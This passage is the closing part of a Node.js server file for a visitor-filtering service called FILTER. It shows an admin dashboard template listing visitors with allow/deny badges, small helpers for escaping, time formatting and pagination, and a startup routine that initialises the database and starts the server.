    +(v.decision==='allow'?'<span class="badge green">✓</span>':'<span class="badge red">✗</span>')
    +'</div>'
    +'<div style="font-size:0.78rem;color:var(--text3);">'+escH(v.isp||'')+'</div>'
    +(v.page?'<div style="font-size:0.75rem;color:var(--pri);font-family:monospace;">'+escH(v.page)+'</div>':'')
    +'<div style="font-size:0.72rem;color:var(--text3);">'+timeSince(v.lastSeen)+'</div>'
    +'</div>'
  ).join('');
}

// ── UTILS ──
function escH(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
function fmtTime(ts) { if(!ts) return '—'; try { return new Date(ts).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit'}); } catch(e){return ts;} }
function timeSince(ts) { const s=Math.floor((Date.now()-ts)/1000); if(s<60) return s+'s ago'; if(s<3600) return Math.floor(s/60)+'m ago'; return Math.floor(s/3600)+'h ago'; }
function countryFlag(code) { if(!code||code.length!==2) return '🌐'; try { return String.fromCodePoint(...[...code.toUpperCase()].map(c=>0x1F1E6+c.charCodeAt(0)-65)); } catch(e){return '🌐';} }
function pagBtns(page, pages, fn) {
  if (pages<=1) return '';
  let html='';
  if(page>1) html+='<button class="page-btn" onclick="'+fn+'('+(page-1)+')">‹</button>';
  for(let i=Math.max(1,page-2);i<=Math.min(pages,page+2);i++) html+='<button class="page-btn'+(i===page?' active':'')+'" onclick="'+fn+'('+i+')">'+i+'</button>';
  if(page<pages) html+='<button class="page-btn" onclick="'+fn+'('+(page+1)+')">›</button>';
  return html;
}
function copyText(txt) {
  navigator.clipboard.writeText(txt).then(()=>toast('Copied!')).catch(()=>toast('Copy failed','error'));
}
</script>
</body>
</html>`;
}

// ─── STARTUP ─────────────────────────────────────────────────────────────────
async function start() {
  await initPassword();
  await initDB();
  await loadCaches();
  await ensureChannelSites();
  console.log('[FILTER] Admin path: /' + ADMIN_PATH);
  console.log('[FILTER] DB:', pool ? 'PostgreSQL' : 'JSON fallback');
  console.log('[FILTER] Sites:', _cacheSites.length, '| Channel sites:',
    _cacheSites.filter(s => s.channelSlug).length);
  app.listen(PORT, '0.0.0.0', () => {
    console.log('[FILTER] Running on port ' + PORT);
  });
}

start().catch(e => {
  console.error('[FILTER] Startup error:', e);
  process.exit(1);
});
